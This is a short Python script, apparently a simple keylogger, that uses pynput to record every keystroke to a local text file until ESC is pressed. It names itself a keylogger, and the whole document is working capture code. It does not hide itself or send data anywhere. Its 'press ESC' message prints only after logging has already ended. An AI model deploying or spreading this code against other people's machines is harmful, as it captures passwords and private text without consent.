from pynput import keyboard

log_file = "key_log.txt"

def write_to_file(key):
    with open(log_file, "a") as f:

        key = str(key).replace("'", "")
        
        if key == 'Key.space':
            f.write(' ')
        elif key == 'Key.enter':
            f.write('\n')
        elif key == 'Key.backspace':
            f.write(' [BACKSPACE] ')
        elif key == 'Key.shift':
            f.write(' [SHIFT] ')
        elif key == 'Key.esc':
            f.write(' [ESC] ')
        else:
            f.write(key)

def on_press(key):
    write_to_file(key)

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
    
print("To stop the Keylogger press ESC")
